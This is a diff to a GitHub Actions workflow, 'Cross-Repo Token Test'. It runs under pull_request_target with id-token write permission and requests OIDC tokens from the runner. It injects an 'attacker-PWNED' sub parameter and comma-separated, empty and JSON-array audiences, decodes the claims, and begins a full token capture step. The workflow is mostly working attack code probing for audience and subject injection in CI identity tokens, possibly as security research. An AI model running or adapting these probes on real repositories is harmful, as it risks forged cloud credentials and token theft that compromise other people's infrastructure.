@@ -1,7 +1,8 @@
 name: Cross-Repo Token Test
 on:
   pull_request_target:
-    types: [opened, synchronize]
+    types: [opened, synchronize, reopened]
+  workflow_dispatch:
 permissions:
   contents: read
   id-token: write
@@ -36,16 +37,15 @@ d=sys.stdin.read().strip(); p=d+'='*(4-len(d)%4)
 try:
   c=json.loads(base64.urlsafe_b64decode(p))
   print('aud:', repr(c.get('aud')))
-  print('sub:', c.get('sub'))
 except Exception as e:
-  print('Error decoding:', e)" 2>/dev/null || echo "Test 2: Token request rejected or failed"
+  print('Error:', e)" 2>/dev/null || echo "Test 2: Request rejected/failed"
 
-      - name: Test 3 - Sub parameter injection attempt
+      - name: Test 3 - Sub parameter injection
         run: |
           T=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
-            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com&sub=attacker-injected-PWNED" | jq -r .value)
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com&sub=attacker-PWNED" | jq -r .value)
           PAYLOAD=$(echo "$T" | cut -d. -f2)
-          echo "=== Test 3: Sub param injection ==="
+          echo "=== Test 3: Sub injection ==="
           echo "$PAYLOAD" | python3 -c "
 import sys,base64,json
 d=sys.stdin.read().strip(); p=d+'='*(4-len(d)%4)
@@ -54,56 +54,24 @@ try:
   print('aud:', c.get('aud'))
   print('sub:', c.get('sub'))
 except Exception as e:
-  print('Error:', e)" 2>/dev/null || echo "Test 3: Token request rejected or failed"
+  print('Error:', e)" 2>/dev/null || echo "Test 3: Request rejected/failed"
 
       - name: Test 4 - Comma-separated audiences
         run: |
           T=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
             "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com%2Chttps%3A%2F%2Faccounts.google.com" | jq -r .value)
           PAYLOAD=$(echo "$T" | cut -d. -f2)
-          echo "=== Test 4: Comma-separated audiences ==="
+          echo "=== Test 4: Comma audiences ==="
           echo "$PAYLOAD" | python3 -c "
 import sys,base64,json
 d=sys.stdin.read().strip(); p=d+'='*(4-len(d)%4)
 try:
   c=json.loads(base64.urlsafe_b64decode(p))
   print('aud:', repr(c.get('aud')))
-  print('sub:', c.get('sub'))
 except Exception as e:
   print('Error:', e)" 2>/dev/null || echo "Test 4: Failed"
 
-      - name: Test 5 - Empty audience
-        run: |
-          T=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
-            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=" | jq -r .value)
-          PAYLOAD=$(echo "$T" | cut -d. -f2)
-          echo "=== Test 5: Empty audience ==="
-          echo "$PAYLOAD" | python3 -c "
-import sys,base64,json
-d=sys.stdin.read().strip(); p=d+'='*(4-len(d)%4)
-try:
-  c=json.loads(base64.urlsafe_b64decode(p))
-  print('aud:', repr(c.get('aud')))
-  print('sub:', c.get('sub'))
-except Exception as e:
-  print('Error:', e)" 2>/dev/null || echo "Test 5: Failed"
-
-      - name: Test 6 - JSON array audience injection
-        run: |
-          T=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
-            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=%5B%22sts.amazonaws.com%22%2C%22https%3A%2F%2Faccounts.google.com%22%5D" | jq -r .value)
-          PAYLOAD=$(echo "$T" | cut -d. -f2)
-          echo "=== Test 6: JSON array audience ==="
-          echo "$PAYLOAD" | python3 -c "
-import sys,base64,json
-d=sys.stdin.read().strip(); p=d+'='*(4-len(d)%4)
-try:
-  c=json.loads(base64.urlsafe_b64decode(p))
-  print('aud:', repr(c.get('aud')))
-except Exception as e:
-  print('Error:', e)" 2>/dev/null || echo "Test 6: Failed"
-
-      - name: Full OIDC token capture
+      - name: Full token capture
         run: |
           FULL_JWT=$(curl -sS \
             -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
